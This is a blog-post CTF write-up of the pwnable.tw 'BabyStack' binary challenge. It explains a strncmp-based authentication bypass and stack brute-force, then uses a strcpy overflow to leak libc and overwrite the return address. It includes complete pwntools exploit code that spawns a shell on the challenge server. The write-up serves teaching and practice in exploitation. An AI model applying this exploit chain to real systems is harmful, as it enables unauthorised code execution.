<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><title>Binary Exploitation [pwnable.tw] - BabyStack - Tainted Bits</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Tainted Bits"><meta name="msapplication-TileImage" content="/images/logo-header.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Tainted Bits"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="Challange Description        Name BabyStack   Points 250   Solves 455 times   Category Exploitation   Description Can you find the password in the stack?"><meta property="og:type" content="article"><meta property="og:title" content="Binary Exploitation [pwnable.tw] - BabyStack"><meta property="og:url" content="https://www.taintedbits.com/2020/07/04/binary-exploitation-pwnable-tw-babystack/"><meta property="og:site_name" content="Tainted Bits"><meta property="og:description" content="Challange Description        Name BabyStack   Points 250   Solves 455 times   Category Exploitation   Description Can you find the password in the stack?"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://www.taintedbits.com/2020/07/04/binary-exploitation-pwnable-tw-babystack/checksec.png"><meta property="og:image" content="https://www.taintedbits.com/2020/07/04/binary-exploitation-pwnable-tw-babystack/main-ui-code.png"><meta property="og:image" content="https://www.taintedbits.com/2020/07/04/binary-exploitation-pwnable-tw-babystack/vulnerable-code.png"><meta property="og:image" content="https://www.taintedbits.com/2020/07/04/binary-exploitation-pwnable-tw-babystack/vulnerable-code2.png"><meta property="og:image" content="https://www.taintedbits.com/2020/07/04/binary-exploitation-pwnable-tw-babystack/libc-leak-p1.png"><meta property="og:image" content="https://www.taintedbits.com/2020/07/04/binary-exploitation-pwnable-tw-babystack/libc-leak-p2-buffer-copy.png"><meta property="og:image" content="https://www.taintedbits.com/2020/07/04/binary-exploitation-pwnable-tw-babystack/overflow-p1.png"><meta property="og:image" content="https://www.taintedbits.com/2020/07/04/binary-exploitation-pwnable-tw-babystack/overflow-p2.png"><meta property="og:image" content="https://www.taintedbits.com/2020/07/04/binary-exploitation-pwnable-tw-babystack/exploit-poc.png"><meta property="article:published_time" content="2020-07-03T18:30:00.000Z"><meta property="article:modified_time" content="2021-06-07T07:03:12.483Z"><meta property="article:author" content="D3xt3r"><meta property="article:tag" content="Linux"><meta property="article:tag" content="CTF"><meta property="article:tag" content="pwnable"><meta property="article:tag" content="pwnable-tw"><meta property="article:tag" content="WarGames"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="checksec.png"><meta property="twitter:creator" content="@0xd3xt3r"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.taintedbits.com/2020/07/04/binary-exploitation-pwnable-tw-babystack/"},"headline":"Tainted Bits","image":["https://www.taintedbits.com/2020/07/04/binary-exploitation-pwnable-tw-babystack/checksec.png","https://www.taintedbits.com/2020/07/04/binary-exploitation-pwnable-tw-babystack/main-ui-code.png","https://www.taintedbits.com/2020/07/04/binary-exploitation-pwnable-tw-babystack/vulnerable-code.png","https://www.taintedbits.com/2020/07/04/binary-exploitation-pwnable-tw-babystack/vulnerable-code2.png","https://www.taintedbits.com/2020/07/04/binary-exploitation-pwnable-tw-babystack/libc-leak-p1.png","https://www.taintedbits.com/2020/07/04/binary-exploitation-pwnable-tw-babystack/libc-leak-p2-buffer-copy.png","https://www.taintedbits.com/2020/07/04/binary-exploitation-pwnable-tw-babystack/overflow-p1.png","https://www.taintedbits.com/2020/07/04/binary-exploitation-pwnable-tw-babystack/overflow-p2.png","https://www.taintedbits.com/2020/07/04/binary-exploitation-pwnable-tw-babystack/exploit-poc.png"],"datePublished":"2020-07-03T18:30:00.000Z","dateModified":"2021-06-07T07:03:12.483Z","author":{"@type":"Person","name":"D3xt3r"},"description":"Challange Description        Name BabyStack   Points 250   Solves 455 times   Category Exploitation   Description Can you find the password in the stack?"}</script><link rel="alternate" href="/atom.xml" title="Tainted Bits" type="application/atom+xml"><link rel="icon" href="/images/logo-header.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/railscasts.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css"><script src="https://www.googletagmanager.com/gtag/js?id=UA-128181439-1" async></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-128181439-1")</script><meta name="generator" content="Hexo 5.4.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/images/logo-header.png" alt="Tainted Bits" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/publications">Publication</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/0xd3xt3r"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time datetime="2020-07-03T18:30:00.000Z" title="7/4/2020, 12:00:00 AM">2020-07-04</time></span><span class="level-item">Updated&nbsp;<time datetime="2021-06-07T07:03:12.483Z" title="6/7/2021, 12:33:12 PM">2021-06-07</time></span><span class="level-item"><a class="link-muted" href="/categories/CTF-Writeups/">CTF Writeups</a></span><span class="level-item">14 minutes read (About 2106 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">Binary Exploitation [pwnable.tw] - BabyStack</h1><div class="content"><h2 id="Challange-Description"><a href="#Challange-Description" class="headerlink" title="Challange Description"></a>Challange Description</h2><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>Name</td><td>BabyStack</td></tr><tr><td>Points</td><td>250</td></tr><tr><td>Solves</td><td>455 times</td></tr><tr><td>Category</td><td>Exploitation</td></tr><tr><td>Description</td><td>Can you find the password in the stack?</td></tr></tbody></table><span id="more"></span><h2 id="Binary-Protection"><a href="#Binary-Protection" class="headerlink" title="Binary Protection"></a>Binary Protection</h2><p>Let’s check the binary protection</p><p><img src="checksec.png" alt="Binary Protection"></p><p>Seems like binary has all the protection are on. We need to leak binary/libc address to create a reliable exploit.</p><h2 id="Vulnerable-Application"><a href="#Vulnerable-Application" class="headerlink" title="Vulnerable Application"></a>Vulnerable Application</h2><p>Below is the decompiled code for the main loop of the application.</p><p><img src="main-ui-code.png" alt="Application Main Loop"></p><p>Before starting the main loop the application allocation a memory via <em>mmap</em> and stores its address in the <em>DAT_unknown_map</em> variable, this is done in function <em>setup_env</em> on line 14. Then its open <em>/dev/urandom</em> and copies 16-byte data into the stack memory. This data is then copied from the stack memory to the memory location pointed by <em>DAT_unknown_map</em>. This data is the password which the user will be authenticated.</p><p>There are three actions in the application which are triggered by integer 1, 2 and 3. The input of 1 will trigger password checking functionality where input is taken( maximum size of 127 bytes) and is checked and if the authentication was successful then the global variable <em>DAT_is_authenticated</em> is set to value of 1 which is done by function <em>check_password</em> on line 30. The input value of 2 will break from the infinite while loop and return from the main function. The input value of 3 will prompt the user for input of maximum 63 bytes which will be copied into the <em>user_buf</em> buffer which is on the stack this is done by <em>copy_user_input</em> function on line 30. There is nothing complicated about this.</p><h3 id="Vulnerable-Code"><a href="#Vulnerable-Code" class="headerlink" title="Vulnerable Code"></a>Vulnerable Code</h3><p>The main vulnerability lies in the authentication function. Try to understand the issue yourself. Below is the code of authentication function.</p><p><img src="vulnerable-code.png" alt="Vulnerable Auth function - check_password function"></p><p>The main culprit of the vulnerability is <strong>strncmp</strong> function in which the number of bytes to compare is calculate using the <em>user_input</em> buffer controlled by the user. So if the user just passes a null byte to compare, it will consider the compare size as zero, and it will return 0(which mean strings are equal), which is basically an authentication bypass. That’s not all since the comparison size can be controll by user, user can choose to set the comparsion size to 1 and compare its input and brute-force the first password byte and, recover that byte. This way we recover one-byte at a time to disclose the stack buffer. Since the limit of the <em>user_input</em> buffer is 127 bytes, you can recover that much stack data. The only thing we need to take care is the null-bytes in the stack buffer which is consider as string termination.</p><p><strong>Stack Layout</strong></p><p>Since the stack data of main function is going to be critical to solve this challenge let see what data is stored on the stack, Below is the stack layout of the stack main function</p><table><thead><tr><th>Offset</th><th>Size</th><th>Value</th></tr></thead><tbody><tr><td>esp</td><td>64</td><td>user copy buf</td></tr><tr><td>esp + 64</td><td>16</td><td>password</td></tr><tr><td>esp + 72</td><td>16</td><td>user action</td></tr><tr><td>esp + 104</td><td>8</td><td>libc main ret addr</td></tr></tbody></table><p>The stack has password, and return address which can be overwritten for code execution (if we can overwrite it!). The return address can also be used to leak libc address(if we can reach it).</p><p>Another vulnerability is in the <strong>copy_user_input</strong> function which uses strcpy function for buffer copy. Let’s look at the code yourself and try to understand it.</p><p><img src="vulnerable-code2.png" alt="Vulnerable Copy function - copy_user_input function "></p><p>At first glance, it’s difficult to understand the overflow. Since the buffer check is done in the <strong>read_userinput</strong> function when reading the input from the user. The buffer into which the data is copied is also of the same size then how will the overflow occur?</p><p>The vulnerability is that if the user input doesn’t have a null byte, <em>strcpy</em> will keep coping the data from the <em>user_input</em> buffer until it encounters the null-byte. If this is not clear don’t worry we will discuss this in more detail in the coming sections.</p><p>I guess that all the primitives we need, <em>auth brute-forcing</em> can be used as <em>read primitive</em> and <em>copy_user_input</em> buffer as <em>write primitive</em>. This way we can create a fully-reliable remote exploit.</p><h2 id="Application-Interaction-Code"><a href="#Application-Interaction-Code" class="headerlink" title="Application Interaction Code"></a>Application Interaction Code</h2><p>Since interactive and crafting exploit input can get tricky here is a class with does the dirty work and provides nice functions to interact with the application</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc_bin = ELF(<span class="string">&#x27;./libc_64.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.REMOTE:</span><br><span class="line">    context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">    io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10205</span>, timeout=<span class="number">2</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./babystack&#x27;</span>,</span><br><span class="line">                 aslr=<span class="literal">True</span>,</span><br><span class="line">                 env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">&#x27;./libc_64.so.6&#x27;</span>&#125;,</span><br><span class="line">                 timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span>:</span></span><br><span class="line">    <span class="string">&#x27;class to interacte with the application&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, proc</span>):</span></span><br><span class="line">        self.proc = proc</span><br><span class="line">        <span class="comment"># stores recoved stack data so that continue the</span></span><br><span class="line">        <span class="comment"># stack search if you set this value to appropriate</span></span><br><span class="line">        <span class="comment"># values</span></span><br><span class="line">        self.recov_data = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">password</span>(<span class="params">self, pwd, flag=<span class="number">0</span></span>):</span></span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">        <span class="comment"># this input is give so that null-byte is not introducted</span></span><br><span class="line">        <span class="comment"># in user_action buffer</span></span><br><span class="line">        self.proc.send(<span class="string">&#x27;1&#x27;</span> + <span class="string">&#x27;B&#x27;</span>*<span class="number">15</span>)</span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;owrd :&#x27;</span>)</span><br><span class="line">        self.proc.send(pwd)</span><br><span class="line">        <span class="comment"># return the input to check if the password or</span></span><br><span class="line">        <span class="comment"># correct or not</span></span><br><span class="line">        res = self.proc.readuntil(<span class="string">&#x27;!\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> res.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exit</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># exit application</span></span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">        self.proc.send(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">copy</span>(<span class="params">self, buf</span>):</span></span><br><span class="line">        <span class="comment"># triggers copy_user_input function</span></span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">        self.proc.send(<span class="string">&#x27;3&#x27;</span> + <span class="string">&#x27;B&#x27;</span> * <span class="number">15</span>)</span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;Copy :&#x27;</span>)</span><br><span class="line">        self.proc.send(buf)</span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;It is magic copy !\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recover_stack</span>(<span class="params">self, stack_len=<span class="number">16</span>, verbose=<span class="literal">True</span></span>):</span></span><br><span class="line">        <span class="comment"># nice wrapper function to brute-forcing wrapper</span></span><br><span class="line">        <span class="comment"># to recoved buffer of desired size </span></span><br><span class="line">        data = self.recov_data</span><br><span class="line">        start = <span class="built_in">len</span>(data)</span><br><span class="line">        <span class="keyword">for</span> sz <span class="keyword">in</span> <span class="built_in">range</span>(start, stack_len):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">                b_data = <span class="string">b&#x27;&#x27;</span>.join(data) + p8(i) + p8(<span class="number">0</span>)</span><br><span class="line">                res = app.password(b_data)</span><br><span class="line">                <span class="keyword">if</span> res.find(<span class="string">&#x27;Login Success !&#x27;</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">                    data.append(p8(i))</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        log.info(<span class="string">&#x27;Recovered Len : &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(data)))</span><br><span class="line">        self.recov_data = data</span><br><span class="line">        <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><h2 id="The-Libc-Leak"><a href="#The-Libc-Leak" class="headerlink" title="The Libc Leak"></a>The Libc Leak</h2><p>Since the binary has non-exec stack protection to execute shellcode we will have to use ROP technique, and for that, we will need libc base address since libc is gadget rich library. Sometimes during function calls address of the libc memory ranges are stored on the stack later the same stack can be reused by the main program, we can use the opportunity to leak the libc address from the stack. This is exactly the case with the <em>copy_user_input</em>/<em>check_password</em> function, below is the stack of <em>copy_user_input</em> function.</p><p><img src="libc-leak-p1.png" alt="*copy_user_input* function stack"></p><p>As you can see in the highlighted box the address of <strong>_IO_file_overflow+235</strong> function is on the stack and the Libc-base is at an offset of <em>0x7a81b</em> from that address. You will provide non-null input in the <em>copy_user_input</em> function to eliminate all the null bytes till the start of the address and once the <em>strcpy</em> function has executed, that buffer will be copied on main function stack which you can brute-force using the <em>check_password</em> function to recover that value. Below is the result of what we just discussed</p><p><img src="libc-leak-p2-buffer-copy.png" alt="*copy_user_input* function stack after stack-reuse technique"></p><p>As you can see the libc address highlighted in green and the buffer which was copied(highlighted in cyan). Below is the code to carry-out the libc-leak.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc_base</span>():</span></span><br><span class="line">    vul_buf = <span class="string">&#x27;C&#x27;</span>*<span class="number">72</span></span><br><span class="line">    app.password(vul_buf)</span><br><span class="line">    app.password(p8(<span class="number">0</span>))</span><br><span class="line">    app.copy(<span class="string">&#x27;CCCC&#x27;</span>)</span><br><span class="line">    app.recov_data = [p8(<span class="number">0x43</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">    st_data = app.recover_stack(<span class="number">14</span>)</span><br><span class="line">    libc_addr = u64(<span class="string">b&#x27;&#x27;</span>.join(st_data[<span class="number">8</span>:]) + p8(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;Leak addr : &#x27;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">    variable_offset = <span class="number">0x7a81b</span></span><br><span class="line">    libc_base = libc_addr - variable_offset</span><br><span class="line">    log.info(<span class="string">&#x27;Libc Base : &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="keyword">return</span> libc_base</span><br></pre></td></tr></table></figure><h2 id="Code-Execution"><a href="#Code-Execution" class="headerlink" title="Code Execution"></a>Code Execution</h2><p>Earlier we discussed that how <em>copy_user_input</em> function can be used to do out-of-bounds write, but there is one question that needs clarity, the <strong>read_userinput</strong> function only takes 63 bytes and the destination buffer(pointed by the function parameter) is just on byte bigger, even if we somehow managed to do the overflow, we cannot control <em>user_input</em>more than 63 bytes, how useful will this overflow would be anyway?<br>The answer is, we just don’t control 63 bytes we can control up 127 bytes, that because before calling the <em>copy_userinput</em> function, we can call <strong>check_password</strong> function which allows you to write value up to 127 bytes, we can prime the stack with whatever data we want and then do a <strong>stack-reuse</strong> by calling <em>copy_userinput</em> function immediately after that, to copy more than 63 bytes of data. Below is an example of once such overflow</p><p><img src="overflow-p1.png" alt="main function return address overwrite with the shellcode address"></p><p>We can eliminate any null-byte in main function stack using this primitive to do a buffer copy of more than 63 bytes, this exactly what we did in the libc-leak, if you read the code closely, we copied bytes in the buffer using this method and, then did brute-force on the stack to recover the libc address.</p><h2 id="Code-Execution-1"><a href="#Code-Execution-1" class="headerlink" title="Code Execution"></a>Code Execution</h2><p>Next, to get code execution we need to overwrite the return address of the main function. We will overwrite the return address with <em>one jump</em> shellcode which you can find using <em>one_gadget</em> tool. Since the libc binary is provided in the challenge run the one_gadget on it to find all the offset at which we have one-shot execution code. After testing different offset, I found the offset <strong>0xf0567</strong> to be working.</p><p><a href="one-gadget.png">one_gadget output</a></p><p>Another security check we need to take care of is the canary check, which is highlighted in the <em>main code function line 51-55</em>. While doing all the buffer manipulation if you keep the original password unchanged you can pass the <em>memcmp</em> check. So before starting any buffer manipulation the first step of the exploit should be to recover the original password with the brute-forcing primitive.</p><p>Below is the code for what we just discussed:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># the magic of one_gadget tool</span></span><br><span class="line">oneshot_shell_addr = libc_base_addr + <span class="number">0xf0567</span></span><br><span class="line"></span><br><span class="line">exploit_payload = &#123;</span><br><span class="line">    <span class="comment"># pass the memcmp condition with the real password</span></span><br><span class="line">    <span class="comment"># this check will help you avoid stack canary check</span></span><br><span class="line">    <span class="number">0x40</span>: real_password,</span><br><span class="line">    <span class="comment"># override return address</span></span><br><span class="line">    <span class="number">0x68</span>: p64(oneshot_shell_addr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># prime the stack with exploit buffer</span></span><br><span class="line">app.password(flat(exploit_payload))</span><br><span class="line">log.info(<span class="string">&#x27;Payload copied&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># put the app in authicated state to do proper function return,</span></span><br><span class="line"><span class="comment"># and not exit() call exit</span></span><br><span class="line">app.password(p8(<span class="number">0</span>))</span><br><span class="line">app.copy(<span class="string">&#x27;A&#x27;</span>*<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>Below is the output of the one-shot shellcode</p><p><img src="overflow-p2.png" alt="one-shot shellcode execution "></p><h2 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h2><p>Putting it all together here the full-working exploit.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Author  : 0xd3xt3r</span></span><br><span class="line"><span class="comment"># Website : taintedbits.com</span></span><br><span class="line"></span><br><span class="line">app = App(io)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;Leaking password&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recover original password to bypass stack canary</span></span><br><span class="line"><span class="comment"># we will use this data later</span></span><br><span class="line">real_password = app.recover_stack(<span class="number">16</span>)</span><br><span class="line">print(hexdump(real_password))</span><br><span class="line">log.info(<span class="string">&#x27;Password leaking done!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># this is done to put the app in de-auth app state</span></span><br><span class="line">app.password(p8(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;Initialized libc base leak!&#x27;</span>)</span><br><span class="line">libc_base_addr = leak_libc_base()</span><br><span class="line">libc_bin.address = libc_base_addr</span><br><span class="line">log.info(<span class="string">&#x27;Leaked libc base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># the magic of one_gadget tool</span></span><br><span class="line">oneshot_shell_addr = libc_base_addr + <span class="number">0xf0567</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># this is done to put the app in de-auth app state</span></span><br><span class="line">app.password(p8(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">exploit_payload = &#123;</span><br><span class="line">    <span class="comment"># pass the memcmp condition with the real password</span></span><br><span class="line">    <span class="comment"># this check will help you avoid stack canary check</span></span><br><span class="line">    <span class="number">0x40</span>: real_password,</span><br><span class="line">    <span class="comment"># override return address</span></span><br><span class="line">    <span class="number">0x68</span>: p64(oneshot_shell_addr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># prime the stack with exploit buffer</span></span><br><span class="line">app.password(flat(exploit_payload))</span><br><span class="line">log.info(<span class="string">&#x27;Payload copied&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># put the app in authicated state to do proper function return,</span></span><br><span class="line"><span class="comment"># and not exit() call exit</span></span><br><span class="line">app.password(p8(<span class="number">0</span>))</span><br><span class="line">app.copy(<span class="string">&#x27;A&#x27;</span>*<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">app.exit()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="Exploit-Execution"><a href="#Exploit-Execution" class="headerlink" title="Exploit Execution"></a>Exploit Execution</h3><p>To summarize the exploit it does the below steps:</p><ol><li>Recover the original password for later use (to bypass canary check)</li><li>Do the libc leak and calculate one-shot shellcode</li><li>Do the main return overwrite with the one-shot shellcode</li><li>Exit the application, this step should give you the shell.</li></ol><p>The brute forcing can be little time consuming so you need to be patient to get the shell. If you execute the above code you should get output something like this.</p><p><img src="exploit-poc.png" alt="Exploit execution output"></p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>This was a wily little stack exploitation challenge which turns out to be very tricky to exploit. This challenge will test some of advance exploitation technique, although on the surface looks like we just manipulating stack. But, we are were reading and writing data to/from the stack with several constrains to achieve code execution.</p></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/Linux/">Linux</a><a class="link-muted mr-2" rel="tag" href="/tags/CTF/">CTF</a><a class="link-muted mr-2" rel="tag" href="/tags/pwnable/">pwnable</a><a class="link-muted mr-2" rel="tag" href="/tags/pwnable-tw/">pwnable-tw</a><a class="link-muted mr-2" rel="tag" href="/tags/WarGames/">WarGames</a></div></article></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2020/07/05/binary-exploitation-pwnable-tw-realloc/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">Binary Exploitation [pwnable.tw] - Realloc</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/"><span class="level-item">Binary Exploitation [pwnable.tw] - Secret Garden</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div id="disqus_thread"><noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div><script>var disqus_config=function(){this.page.url="https://www.taintedbits.com/2020/07/04/binary-exploitation-pwnable-tw-babystack/",this.page.identifier="/2020/07/04/binary-exploitation-pwnable-tw-babystack/"};!function(){var t=document,e=t.createElement("script");e.src="//taintedbits.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen order-1"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#Challange-Description"><span class="level-left"><span class="level-item">1</span><span class="level-item">Challange Description</span></span></a></li><li><a class="level is-mobile" href="#Binary-Protection"><span class="level-left"><span class="level-item">2</span><span class="level-item">Binary Protection</span></span></a></li><li><a class="level is-mobile" href="#Vulnerable-Application"><span class="level-left"><span class="level-item">3</span><span class="level-item">Vulnerable Application</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Vulnerable-Code"><span class="level-left"><span class="level-item">3.1</span><span class="level-item">Vulnerable Code</span></span></a></li></ul></li><li><a class="level is-mobile" href="#Application-Interaction-Code"><span class="level-left"><span class="level-item">4</span><span class="level-item">Application Interaction 